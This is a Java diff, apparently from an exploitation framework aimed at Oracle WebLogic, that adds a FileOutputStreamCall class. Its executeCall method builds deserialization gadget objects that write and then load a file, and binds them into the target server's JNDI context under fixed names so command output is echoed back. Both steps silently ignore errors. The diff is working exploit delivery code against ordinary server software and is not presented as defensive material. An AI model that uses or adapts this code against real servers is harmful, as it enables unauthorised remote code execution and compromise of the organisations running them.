@@ -12,26 +12,28 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-
 package com.r4v3zn.weblogic.framework.call;
 
+import com.r4v3zn.weblogic.framework.enmus.CallEnum;
 import com.r4v3zn.weblogic.framework.entity.ContextPojo;
 import com.r4v3zn.weblogic.framework.entity.GadgetParam;
 import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
 import com.r4v3zn.weblogic.framework.vuls.VulTest;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
+import lombok.extern.log4j.Log4j2;
 
 /**
- * Title: Call
- * Desc: Call
- * Date:2020/4/4 23:18
- * @author 0nise
+ * Title: WriteCall
+ * Desc: FileOutputStream 回显
+ * Date:2020/7/14 00:17
+ * Email:woo0nise@gmail.com
+ * Company:www.j2ee.app
+ *
+ * @author R4v3zn
  * @version 1.0.0
  */
-public interface Call {
+@Log4j2
+public class FileOutputStreamCall implements Call {
 
-    Logger log = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
 
     /**
      * 执行回显方案前置
@@ -42,5 +44,20 @@ public interface Call {
      * @param contextPojo 链接对象
      * @return
      */
-    ContextPojo executeCall(GadgetParam param, VulTest vulTest, final Class<? extends ObjectGadget<?>> gadgetClazz, ContextPojo contextPojo);
+    @Override
+    public ContextPojo executeCall(GadgetParam param, VulTest vulTest, Class<? extends ObjectGadget<?>> gadgetClazz, ContextPojo contextPojo) {
+        try {
+            ObjectGadget gadget = gadgetClazz.newInstance();
+            Object object = gadget.getWriteFileObject(param);
+            contextPojo.getContext().rebind("write_8kgumc08erbo7osp", object);
+        } catch (Exception e) {
+        }
+        try{
+            ObjectGadget gadget = gadgetClazz.newInstance();
+            Object object = gadget.getLoadFileObject(param);
+            contextPojo.getContext().rebind("load_8kgumc08erbo7osp", object);
+        }catch (Exception e){
+        }
+        return contextPojo;
+    }
 }
